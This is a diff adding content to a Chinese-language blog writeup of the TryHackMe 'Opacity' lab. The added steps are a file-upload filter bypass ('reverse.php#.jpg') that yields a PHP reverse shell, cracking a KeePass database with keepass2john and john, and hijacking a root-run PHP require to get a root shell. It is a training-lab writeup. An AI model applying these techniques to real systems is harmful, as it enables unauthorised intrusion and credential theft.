@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "TryHackMe Challenge Writeup: Opacity"
-date:   27 June 2025
+date:   30 June 2025
 categories: Demo
 tags: TryHackMe-Challenge Writeup
 ---
@@ -10,6 +10,7 @@ tags: TryHackMe-Challenge Writeup
 <div markdown="block" style="margin-top: 10px">
     
 ### Intro
+本篇是關於TryHackMe上的Challenge: [Opacity](https://tryhackme.com/room/opacity) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度
 
 ### Step 1. Nmap
 
@@ -123,15 +124,93 @@ url=http%3A%2F%2Flocalhost%2Fhome
 
 - 不管怎樣，先測試功能，我馬上在自己的主機上開了一個python http server並生成一張圖片，在External URL中輸入 `http://10.4.9.189:8000/test.jpg` 之後會成功上傳並提供一個Image Link: `http://10.10.102.57/cloud/images/test.jpg`
 
+- 並且發現有對文件名字做過濾，只接受 .jpg 格式，因此我們嘗試上傳一個php-reverse-shell的文件並通過修改文件名的方式來繞過檢驗機制: `http://10.4.9.189:8000/reverse.php#.jpg`
+- 成功上傳後會獲得一個暫時性的圖片URL鏈接，馬上在瀏覽器中輸入這個鏈接觸發執行這個PHP文件
+- 成功獲得reverse shell，用戶為www-data
+
+### Step 4. 提權(user)
+- 首先 `ls -l /home` 查看有哪些用戶并且 user flag 放在哪個用戶底下就代表我們要提權到哪個用戶
+- 發現 `local.txt` 被放在用戶 **sysadmin** 下，并且 www-data 沒辦法直接讀
+- 那麽首先先查有哪些文件 user=sysadmin 并且是不常見的:
+
+```bash
+$ find / -user sysadmin -perm -400 2>/dev/null | grep -v proc
+/opt/dataset.kdbx
+/home/sysadmin
+/home/sysadmin/.sudo_as_admin_successful
+/home/sysadmin/.ssh
+/home/sysadmin/.bash_history
+/home/sysadmin/scripts/lib
+/home/sysadmin/local.txt
+/home/sysadmin/.bashrc
+/home/sysadmin/.cache
+/home/sysadmin/.gnupg
+/home/sysadmin/.bash_logout
+/home/sysadmin/.profile
+```
+
+- 發現一個 `dataset.kdbx` 並且通過查詢得知是一個由 KeePass 密碼安全管理工具生成的一個文件，裏面應該有 sysadmin 的相關密碼
+- 使用 `keepassxc` 嘗試讀出但發現需要密碼，那麽看看 john 或 hashcat 有沒有相應的工具可以爆破的
+- 查到 `keepass2john` 可以將 .kdbx 轉爲適合john處理的格式並使用 john 破解: `keepass2john dataset.kdbx > dataset && john --wordlist=rockyou.txt dataset`
+
+```bash
+└─# john --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt dataset
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (dataset)     
+1g 0:00:00:23 DONE (2025-06-29 21:06) 0.04269g/s 39.28p/s 39.28c/s 39.28C/s 741852963
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+- 再次使用 `keepassxc` 打開，輸入密碼，得到 sysadmin 的密碼: C********************0
+- ssh登入用戶sysadmin，成功登入獲得user flag
+
+### Step 5. 提權(root)
+- 首先找到 `/home/sysadmin` 下有一個 scripts folder 擁有者為 root 并且 sysadmin 可以看
+- 進去看發現有一個 script.php 并且作用為每當上傳完一個檔案后會執行這個script.php備份
+
+```bash
+sysadmin@ip-10-10-135-178:~/scripts$ cat script.php
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
+```
+
+- 并且發現一行 `require_once('lib/backup.inc.php')` 查過後發現會執行這麽一個php檔案，并且發現它的路徑使用相對路徑且這個文件夾我可以修改/添加檔案
+- 那麽我先刪除掉原本的 backup.inc.php 並新增一個同名的檔案，且檔案内容執行 reverse shell
+- 我期許的就是利用 script.php 是root權限并且每次備份時會執行一次 `require_once('lib/backup.inc.php')`，進一步執行 `backup.inc.php`，那麽我們只要在 `backup.inc.php` 中放入 reverse shell 就可以獲得root權限
+- 最後上傳檔案並觸發執行 `backup.inc.php`，成功獲得 root shell
+
 
 
 ### 自我總結
+總而言之 opacity 其實不難，主要是有一個rabbit hole: SMB讓我卡關很久，一直想要利用SMB漏洞結果忽略了網頁路徑枚舉出的結果
 
+另外就是 Keepass 所使用的 .kdbx 也是第一次看到所以上網查了一下，也是進一步認識到說有這種密碼管理工具和副檔名，下一次碰到就不會忽略掉這麽個關鍵信息
 
 ## 學習資料
-1. [TryHackMe - SQLMap: The Basics](https://tryhackme.com/room/sqlmapthebasics)
-2. [TryHackMe - SQLMAP](https://tryhackme.com/room/sqlmap)
-3. [TryHackMe - GameZone](https://tryhackme.com/room/gamezone)
+1. [TryHackMe Challenge: Opacity](https://tryhackme.com/room/opacity)
+2. [Writeup 1: Opacity](https://github.com/0xDeco/CTF-Notes/tree/main/Opacity)
+3. [Writeup 2: Opacity](https://www.youtube.com/watch?v=oTWxXR7QywY)
 
 </div>
 </body>
